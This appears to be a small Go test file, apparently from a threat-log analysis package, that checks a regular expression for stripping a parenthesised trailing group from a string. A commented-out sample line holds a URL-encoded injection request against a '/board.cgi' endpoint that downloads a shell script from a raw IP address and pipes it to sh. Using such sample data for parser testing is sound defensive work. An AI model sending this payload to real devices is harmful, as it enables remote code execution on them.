package apt

import (
	"fmt"
	"regexp"
	"testing"
)

func Test_re(t *testing.T) {
	text := ""
	//text ="182.150.0.117(/board.cgi?cmd=wget%20http%3a%2f%2f2.56.56.78%2fchinaipcam.sh%20-o-%20%7c%20sh)"
	text = "(www.meigene.cn)/f.php"

	// 查找 Abc 或 a7c，替换为 Abccc a7ccc
	reg := regexp.MustCompile(`(\(.*?\))$`)
	fmt.Println(reg.ReplaceAllString(text, `${1}`))
	fmt.Println(reg.ReplaceAllString(text, ``))
}
